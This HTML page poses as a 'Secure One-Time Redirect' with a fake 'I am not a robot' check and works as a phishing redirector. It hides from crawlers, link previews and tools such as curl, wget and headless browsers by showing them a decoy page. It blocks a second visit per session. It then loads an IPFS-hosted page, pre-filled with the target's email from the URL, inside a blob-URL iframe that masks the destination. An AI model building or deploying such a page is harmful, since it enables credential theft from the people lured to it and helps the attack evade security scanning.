<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Secure One-Time Redirect</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    @keyframes spin { from { transform:rotate(0deg);} to {transform:rotate(360deg);} }
    @keyframes rotateRobot { from {transform:rotate(0deg);} to {transform:rotate(360deg);} }

    html, body { margin:0; padding:0; width:100%; height:100%; font-family:'Segoe UI', Tahoma, sans-serif; }
    #overlay {
        position:fixed; top:0; left:0; right:0; bottom:0;
        background:#f0f2f5; display:flex; align-items:center; justify-content:center;
        opacity:0; transition:opacity 0.3s ease; z-index:99999;
    }
    #verificationBox {
        background:#fff; padding:26px 32px; border-radius:8px;
        width:310px; text-align:left; border:1px solid #dcdcdc;
        box-shadow:0 6px 20px rgba(0,0,0,0.12);
    }
    #robotIcon { width:32px; height:32px; border-radius:50%; background:#e8f0fe;
        display:flex; align-items:center; justify-content:center; animation:rotateRobot 2s linear infinite; font-size:20px; }
    #checkbox { width:26px; height:26px; border:2px solid #7f8fa6; border-radius:4px; cursor:pointer; transition:0.3s; }
    #verifying { margin-top:18px; display:none; font-size:14px; color:#555; }
    .spinner { width:16px; height:16px; border-radius:50%; border:3px solid #40739e; border-top-color:transparent; animation:spin 0.6s linear infinite; }
    #badge { font-size:10px; color:#888; margin-top:18px; text-align:right; opacity:0.7; }
</style>
</head>
<body>

<div id="overlay">
    <div id="verificationBox">
        <div style="display:flex; align-items:center; gap:12px;">
            <div id="robotIcon">ðŸ¤–</div>
            <div style="flex:1;"><strong style="font-size:15px; color:#333;">I am not a robot</strong></div>
            <div id="checkbox"></div>
        </div>
        <div id="verifying">
            <div style="display:flex; align-items:center; gap:8px;">
                <div class="spinner"></div> Verifyingâ€¦
            </div>
        </div>
        <div id="badge">Protected by Human Verification</div>
    </div>
</div>

<script>
/* ----------------------------------
   CONFIG
---------------------------------- */
const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
const ONE_TIME_KEY = "redirect_used_once";

/* ----------------------------------
   ONE-TIME PER SESSION PROTECTION
---------------------------------- */
if (sessionStorage.getItem(ONE_TIME_KEY)) {
    document.body.innerHTML = `
        <div style="width:100%; height:100vh; display:flex; align-items:center; justify-content:center; font-family:Arial; color:#333;">
            <div><h2>Link Expired</h2><p>This link can only be used once per session.</p></div>
        </div>`;
    throw new Error("One-time link already used.");
}

/* ----------------------------------
   HUMAN DETECTION
---------------------------------- */
let humanMoved = false;
window.addEventListener("mousemove", () => humanMoved = true);
window.addEventListener("touchstart", () => humanMoved = true);

// Bot detection (basic but effective)
function isBot() {
    const ua = navigator.userAgent.toLowerCase();
    const botWords = [
        "bot","crawl","spider","slurp","fetch","preview","facebook","discord",
        "telegram","linkedin","whatsapp","headless","python","curl","wget","scrapy",
        "phantom","selenium","puppeteer","playwright","httpclient","go-http"
    ];
    if (botWords.some(x => ua.includes(x))) return true;
    if (navigator.webdriver && !window._testing) return true;
    return false;
}

function showFakePage() {
    document.body.innerHTML = `<div style="width:100%; height:100vh; display:flex;
        align-items:center; justify-content:center;">
        <div><h2>Welcome</h2><p>This page is currently unavailable.</p></div></div>`;
}

/* ----------------------------------
   HUMAN VERIFICATION UI
---------------------------------- */
function requireVerification() {
    return new Promise(resolve => {
        const overlay = document.getElementById("overlay");
        overlay.style.opacity = 1;

        const checkbox = document.getElementById("checkbox");
        const verifying = document.getElementById("verifying");

        checkbox.addEventListener("click", verify);
        checkbox.addEventListener("touchstart", verify);

        function verify() {
            checkbox.style.background = "#40739e";
            checkbox.style.borderColor = "#40739e";
            verifying.style.display = "block";

            setTimeout(() => {
                overlay.style.opacity = 0;
                setTimeout(() => overlay.remove(), 300);
                resolve(true);
            }, 1200);
        }
    });
}

/* ----------------------------------
   URL + BLOB BUILDING
---------------------------------- */
function getEmail() {
    return new URLSearchParams(location.search).get("email") || "";
}

function buildIPFS(email) {
    return email ? BASE_IPFS + "#" + email : BASE_IPFS;
}

function createBlobHTML(url) {
    return `
    <!DOCTYPE html><html><head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;}
    iframe{width:100%;height:100%;border:none;}</style>
    </head><body><iframe src="${url}"></iframe></body></html>`;
}

/* ----------------------------------
   MAIN
---------------------------------- */
document.addEventListener("DOMContentLoaded", async () => {
    if (isBot()) return showFakePage();

    await new Promise(r => setTimeout(r, 300 + Math.random() * 300));
    if (!humanMoved) await new Promise(r => setTimeout(r, 500));

    await requireVerification();

    sessionStorage.setItem(ONE_TIME_KEY, "used");

    const email = getEmail();
    const redirectURL = buildIPFS(email);
    const blobHTML = createBlobHTML(redirectURL);
    const blobURL = URL.createObjectURL(new Blob([blobHTML], { type:"text/html" }));

    window.location.href = blobURL;
});
</script>

</body>
</html>

